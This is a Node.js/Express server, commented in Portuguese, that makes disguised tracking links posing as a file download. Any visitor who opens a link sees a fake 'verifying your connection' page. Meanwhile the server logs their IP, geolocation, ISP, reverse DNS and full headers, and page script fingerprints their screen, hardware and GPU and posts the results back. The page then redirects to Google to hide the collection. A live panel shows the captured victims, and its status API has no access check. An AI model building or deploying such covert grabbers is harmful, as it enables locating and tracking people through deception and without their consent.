const express = require('express');
const axios = require('axios');
const cors = require('cors');
const dns = require('dns').promises;
require('dotenv').config();

const app = express();
const PORTA = process.env.PORT || 3000;
const SENHA_ADMIN = '2311';
const endpoints = new Map();
const visitantes = new Map();
const EXPIRACAO_DADOS = 24 * 60 * 60 * 1000;

app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

const instanciaAxios = axios.create({
    timeout: 10000,
    headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    }
});

function gerarIdentificadorUnico(tamanho = 24) {
    const caracteres = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let resultado = '';
    for (let i = 0; i < tamanho; i++) {
        resultado += caracteres.charAt(Math.floor(Math.random() * caracteres.length));
    }
    return resultado;
}

function obterIPCliente(req) {
    const cabecalhos = [
        'cf-connecting-ip', 'x-forwarded-for', 'x-real-ip', 'x-client-ip',
        'x-forwarded', 'forwarded-for', 'x-original-forwarded-for',
        'x-cluster-client-ip', 'true-client-ip'
    ];

    for (const cabecalho of cabecalhos) {
        const valor = req.headers[cabecalho];
        if (valor) {
            const ips = String(valor).split(',').map(ip => ip.trim());
            for (const ip of ips) {
                if (validarIP(ip)) return ip;
            }
        }
    }
    return req.ip || req.connection?.remoteAddress || '127.0.0.1';
}

function validarIP(ip) {
    if (!ip || typeof ip !== 'string') return false;
    const ipLimpo = ip.trim();
    if (['::1', '127.0.0.1', 'localhost'].includes(ipLimpo)) return false;
    const regexIPv4 = /^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
    const regexIPv6 = /^[0-9a-fA-F:]+$/;
    return regexIPv4.test(ipLimpo) || (regexIPv6.test(ipLimpo) && ipLimpo.includes(':'));
}

async function coletarDadosRede(ip) {
    const resultados = { status: 'erro', fontes: [] };
    
    try {
        const res = await instanciaAxios.get(`http://ip-api.com/json/${ip}?fields=66846719`);
        if (res.data.status === 'success') {
            Object.assign(resultados, {
                status: 'sucesso',
                ip: res.data.query,
                continente: res.data.continent,
                codigoContinente: res.data.continentCode,
                pais: res.data.country,
                codigoPais: res.data.countryCode,
                regiao: res.data.region,
                nomeRegiao: res.data.regionName,
                cidade: res.data.city,
                distrito: res.data.district,
                cep: res.data.zip,
                latitude: res.data.lat,
                longitude: res.data.lon,
                fusoHorario: res.data.timezone,
                offsetFuso: res.data.offset,
                moeda: res.data.currency,
                isp: res.data.isp,
                organizacao: res.data.org,
                as: res.data.as,
                nomeAs: res.data.asname,
                reverso: res.data.reverse,
                movel: res.data.mobile,
                proxy: res.data.proxy,
                hospedagem: res.data.hosting
            });
            resultados.fontes.push('ip-api');
        }
    } catch (e) {}

    if (resultados.status === 'erro') {
        try {
            const res = await instanciaAxios.get(`https://ipinfo.io/${ip}/json`);
            if (res.data && res.data.ip) {
                const [lat, lon] = res.data.loc ? res.data.loc.split(',').map(Number) : [null, null];
                Object.assign(resultados, {
                    status: 'sucesso',
                    ip: res.data.ip,
                    cidade: res.data.city,
                    regiao: res.data.region,
                    pais: res.data.country,
                    cep: res.data.postal,
                    latitude: lat,
                    longitude: lon,
                    fusoHorario: res.data.timezone,
                    isp: res.data.org,
                    hostname: res.data.hostname
                });
                resultados.fontes.push('ipinfo');
            }
        } catch (e) {}
    }

    return resultados;
}

async function obterDNSReverso(ip) {
    try {
        if (!validarIP(ip)) return null;
        const hosts = await dns.reverse(ip);
        return hosts.length > 0 ? hosts[0] : null;
    } catch (e) {
        return null;
    }
}

function analisarUserAgent(ua) {
    let navegador = 'Desconhecido';
    let sistemaOperacional = 'Desconhecido';
    let dispositivo = 'Desktop';

    if (/chrome|crios/i.test(ua)) navegador = 'Chrome';
    else if (/firefox|fxios/i.test(ua)) navegador = 'Firefox';
    else if (/safari/i.test(ua)) navegador = 'Safari';
    else if (/edg/i.test(ua)) navegador = 'Edge';
    else if (/opr/i.test(ua)) navegador = 'Opera';

    if (/windows/i.test(ua)) sistemaOperacional = 'Windows';
    else if (/macintosh|mac os x/i.test(ua)) sistemaOperacional = 'macOS';
    else if (/linux/i.test(ua)) sistemaOperacional = 'Linux';
    else if (/android/i.test(ua)) sistemaOperacional = 'Android';
    else if (/iphone|ipad|ipod/i.test(ua)) sistemaOperacional = 'iOS';

    if (/mobile|android|iphone|ipad|ipod/i.test(ua)) dispositivo = 'Móvel';
    if (/tablet|ipad/i.test(ua)) dispositivo = 'Tablet';

    return { navegador, sistemaOperacional, dispositivo };
}

async function coletarDadosCompletos(req) {
    const ip = obterIPCliente(req);
    const agora = new Date();
    
    const [dadosRede, dnsReverso] = await Promise.allSettled([
        coletarDadosRede(ip),
        obterDNSReverso(ip)
    ]);

    const ua = req.headers['user-agent'] || '';
    const infoUA = analisarUserAgent(ua);

    return {
        id: gerarIdentificadorUnico(16),
        dataHora: agora.toISOString(),
        timestamp: agora.getTime(),
        rede: {
            ip: ip,
            versao: ip.includes(':') ? 'IPv6' : 'IPv4',
            dnsReverso: dnsReverso.status === 'fulfilled' ? dnsReverso.value : null,
            geolocalizacao: dadosRede.status === 'fulfilled' ? dadosRede.value : null,
            cabecalhos: req.headers
        },
        cliente: {
            userAgent: ua,
            ...infoUA,
            idioma: req.headers['accept-language'],
            codificacao: req.headers['accept-encoding'],
            conexao: req.headers['connection'],
            referencia: req.headers['referer'] || 'Direto'
        }
    };
}

app.get('/gerar/:senha', (req, res) => {
    if (req.params.senha !== SENHA_ADMIN) return res.status(403).json({ erro: 'Acesso negado' });
    
    const id = gerarIdentificadorUnico(12);
    const novoEndpoint = {
        id,
        criadoEm: new Date().toISOString(),
        expiraEm: Date.now() + (7 * 24 * 60 * 60 * 1000),
        totalVisitas: 0,
        ultimaVisita: null
    };
    
    endpoints.set(id, novoEndpoint);
    visitantes.set(id, []);
    
    const base = `${req.protocol}://${req.get('host')}`;
    res.json({
        status: 'sucesso',
        link: `${base}/file/${id}`,
        monitor: `${base}/painel/${id}`,
        dados: `${base}/api/dados/${id}/${SENHA_ADMIN}`
    });
});

app.get('/file/:id', async (req, res) => {
    const { id } = req.params;
    if (!endpoints.has(id)) return res.status(404).send('Link expirado ou inválido.');

    const dados = await coletarDadosCompletos(req);
    const infoEndpoint = endpoints.get(id);
    infoEndpoint.totalVisitas++;
    infoEndpoint.ultimaVisita = dados.dataHora;
    
    visitantes.get(id).push(dados);

    res.send(`
        <!DOCTYPE html>
        <html lang="pt-br">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Carregando Conteúdo...</title>
            <style>
                body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f4f7f6; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #333; }
                .card { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); text-align: center; max-width: 400px; width: 90%; }
                .spinner { border: 4px solid rgba(0,0,0,0.1); width: 40px; height: 40px; border-radius: 50%; border-left-color: #09f; animation: spin 1s linear infinite; margin: 0 auto 20px; }
                @keyframes spin { to { transform: rotate(360deg); } }
                h1 { font-size: 20px; margin-bottom: 10px; }
                p { font-size: 14px; color: #666; line-height: 1.5; }
            </style>
        </head>
        <body>
            <div class="card">
                <div class="spinner"></div>
                <h1>Verificando sua conexão</h1>
                <p>Aguarde um momento enquanto preparamos o conteúdo seguro para você. Isso pode levar alguns segundos.</p>
            </div>
            <script>
                (async () => {
                    const dadosExtras = {
                        tela: {
                            largura: screen.width,
                            altura: screen.height,
                            profundidadeCor: screen.colorDepth,
                            orientacao: screen.orientation ? screen.orientation.type : 'n/a'
                        },
                        janela: {
                            larguraInterna: window.innerWidth,
                            alturaInterna: window.innerHeight
                        },
                        hardware: {
                            nucleos: navigator.hardwareConcurrency,
                            memoria: navigator.deviceMemory,
                            pontosToque: navigator.maxTouchPoints
                        },
                        navegador: {
                            plataforma: navigator.platform,
                            idiomas: navigator.languages,
                            cookiesHabilitados: navigator.cookieEnabled,
                            fusoHorario: Intl.DateTimeFormat().resolvedOptions().timeZone,
                            pdfViewer: navigator.pdfViewerEnabled
                        },
                        gpu: (() => {
                            try {
                                const canvas = document.createElement('canvas');
                                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                                if (!gl) return 'n/a';
                                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                                return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'n/a';
                            } catch (e) { return 'erro'; }
                        })()
                    };

                    try {
                        await fetch('/api/coleta-extra/${id}/${dados.id}', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify(dadosExtras)
                        });
                    } catch (e) {}
                    
                    setTimeout(() => {
                        window.location.href = 'https://www.google.com.br';
                    }, 2000);
                })();
            </script>
        </body>
        </html>
    `);
});

app.post('/api/coleta-extra/:id/:visitanteId', (req, res) => {
    const { id, visitanteId } = req.params;
    const lista = visitantes.get(id);
    if (lista) {
        const v = lista.find(item => item.id === visitanteId);
        if (v) {
            v.cliente.detalhesHardware = req.body;
            v.cliente.extraColetadoEm = new Date().toISOString();
        }
    }
    res.json({ status: 'ok' });
});

app.get('/painel/:id', (req, res) => {
    const { id } = req.params;
    if (!endpoints.has(id)) return res.status(404).send('Painel não encontrado.');

    res.send(`
        <!DOCTYPE html>
        <html lang="pt-br">
        <head>
            <meta charset="UTF-8">
            <title>Painel de Monitoramento - ${id}</title>
            <style>
                body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0f172a; color: #e2e8f0; margin: 0; padding: 20px; }
                .container { max-width: 1200px; margin: 0 auto; }
                .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; border-bottom: 1px solid #1e293b; padding-bottom: 20px; }
                .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }
                .stat-card { background: #1e293b; padding: 20px; border-radius: 12px; border: 1px solid #334155; }
                .stat-value { font-size: 24px; font-weight: bold; color: #38bdf8; }
                .stat-label { font-size: 12px; color: #94a3b8; text-transform: uppercase; margin-top: 5px; }
                .visit-list { display: flex; flex-direction: column; gap: 15px; }
                .visit-card { background: #1e293b; border-radius: 12px; padding: 20px; border: 1px solid #334155; transition: transform 0.2s; }
                .visit-card:hover { transform: translateY(-2px); border-color: #38bdf8; }
                .visit-header { display: flex; justify-content: space-between; margin-bottom: 15px; }
                .ip-badge { background: #38bdf8; color: #0f172a; padding: 4px 10px; border-radius: 6px; font-weight: bold; font-family: monospace; }
                .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 15px; }
                .info-item { font-size: 13px; margin-bottom: 5px; }
                .info-label { color: #94a3b8; margin-right: 5px; }
                .badge { padding: 2px 8px; border-radius: 4px; font-size: 11px; font-weight: bold; }
                .badge-geo { background: #10b981; color: white; }
                .badge-os { background: #6366f1; color: white; }
                pre { background: #000; padding: 10px; border-radius: 6px; overflow-x: auto; font-size: 11px; color: #10b981; }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>Monitoramento em Tempo Real</h1>
                    <div>ID: <code>${id}</code></div>
                </div>
                <div id="stats" class="stats"></div>
                <div id="visitantes" class="visit-list">
                    <p>Carregando dados...</p>
                </div>
            </div>
            <script>
                async function atualizar() {
                    try {
                        const res = await fetch('/api/status/${id}');
                        const data = await res.json();
                        
                        document.getElementById('stats').innerHTML = \`
                            <div class="stat-card">
                                <div class="stat-value">\${data.totalVisitas}</div>
                                <div class="stat-label">Total de Visitas</div>
                            </div>
                            <div class="stat-card">
                                <div class="stat-value">\${data.visitantes.length}</div>
                                <div class="stat-label">Registros Ativos</div>
                            </div>
                            <div class="stat-card">
                                <div class="stat-value">\${new Date(data.criadoEm).toLocaleDateString()}</div>
                                <div class="stat-label">Criado em</div>
                            </div>
                        \`;

                        const lista = data.visitantes.reverse();
                        document.getElementById('visitantes').innerHTML = lista.map(v => \`
                            <div class="visit-card">
                                <div class="visit-header">
                                    <span class="ip-badge">\${v.rede.ip}</span>
                                    <span style="color: #94a3b8; font-size: 12px;">\${new Date(v.dataHora).toLocaleString()}</span>
                                </div>
                                <div class="grid">
                                    <div>
                                        <div class="info-item"><span class="info-label">Local:</span> \${v.rede.geolocalizacao?.cidade || '?'}, \${v.rede.geolocalizacao?.pais || '?'}</div>
                                        <div class="info-item"><span class="info-label">Provedor:</span> \${v.rede.geolocalizacao?.isp || '?'}</div>
                                        <div class="info-item"><span class="info-label">DNS:</span> \${v.rede.dnsReverso || 'Nenhum'}</div>
                                    </div>
                                    <div>
                                        <div class="info-item"><span class="info-label">Sistema:</span> <span class="badge badge-os">\${v.cliente.sistemaOperacional}</span></div>
                                        <div class="info-item"><span class="info-label">Navegador:</span> \${v.cliente.navegador}</div>
                                        <div class="info-item"><span class="info-label">Dispositivo:</span> \${v.cliente.dispositivo}</div>
                                    </div>
                                    <div>
                                        <div class="info-item"><span class="info-label">Resolução:</span> \${v.cliente.detalhesHardware?.tela?.largura || '?'}x\${v.cliente.detalhesHardware?.tela?.altura || '?'}</div>
                                        <div class="info-item"><span class="info-label">GPU:</span> \${v.cliente.detalhesHardware?.gpu || '?'}</div>
                                        <div class="info-item"><span class="info-label">Proxy/VPN:</span> \${v.rede.geolocalizacao?.proxy ? 'Sim' : 'Não'}</div>
                                    </div>
                                </div>
                                <details style="margin-top: 15px;">
                                    <summary style="cursor: pointer; font-size: 12px; color: #38bdf8;">Ver JSON Completo</summary>
                                    <pre>\${JSON.stringify(v, null, 2)}</pre>
                                </details>
                            </div>
                        \`).join('');
                    } catch (e) {
                        console.error(e);
                    }
                }
                setInterval(atualizar, 3000);
                atualizar();
            </script>
        </body>
        </html>
    `);
});

app.get('/api/status/:id', (req, res) => {
    const { id } = req.params;
    if (!endpoints.has(id)) return res.status(404).json({ erro: 'Não encontrado' });
    
    const info = endpoints.get(id);
    const listaVisitantes = visitantes.get(id) || [];
    
    res.json({
        ...info,
        visitantes: listaVisitantes
    });
});

app.get('/api/dados/:id/:senha', (req, res) => {
    const { id, senha } = req.params;
    if (senha !== SENHA_ADMIN) return res.status(403).json({ erro: 'Acesso negado' });
    if (!visitantes.has(id)) return res.status(404).json({ erro: 'Não encontrado' });
    
    res.json({
        endpoint: endpoints.get(id),
        visitantes: visitantes.get(id)
    });
});

app.get('/api/listar/:senha', (req, res) => {
    if (req.params.senha !== SENHA_ADMIN) return res.status(403).json({ erro: 'Acesso negado' });
    res.json(Array.from(endpoints.values()));
});

setInterval(() => {
    const agora = Date.now();
    for (const [id, info] of endpoints.entries()) {
        if (agora > info.expiraEm) {
            endpoints.delete(id);
            visitantes.delete(id);
        }
    }
}, 600000);

module.exports = app;
